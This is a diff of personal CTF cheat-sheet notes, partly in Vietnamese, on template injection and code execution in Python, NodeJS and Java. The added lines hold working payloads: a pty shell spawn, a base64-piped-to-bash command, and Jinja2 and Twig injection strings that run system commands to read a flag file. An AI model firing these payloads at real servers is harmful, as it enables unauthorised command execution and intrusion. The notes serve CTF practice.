@@ -2,7 +2,8 @@ Không nhất thiết phải SSTI để RCE mà dùng coi có thể tận dụng
 Flag Holder
 https://hackmd.io/@onsra03/SkiBeaed3
 -----------------------------------------python
-__import__('pty').spawn('sh')
+__import__('pty').spawn('/bin/bash')
+python -c '__import__('os').system('echo -n <base64-code> | base64 | bash')'
 https://podalirius.net/en/ctf-writeups/fcsc-2021-intro-snake/
 
 https://flask.palletsprojects.com/en/2.0.x/templating/
@@ -48,6 +49,8 @@ https://hackmd.io/@to016/imaginaryCTF2022 -- minigolf
 ----------------------------------------------------------NODEJS
 <%=JSON.stringify(process)%>  kiểm tra giá trị process
 https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet
+https://hackmd.io/@endy/rJdvqhUwn
+{% print([].__class__.__mro__[1].__subclasses__()[394]('nl flag.txt',shell=True,stdout=-1).communicate()[0])%}.txt
 ----------------------------------------------------------payload
 {{['ls']|map('system')|join}}
 --------------------------------------------------java
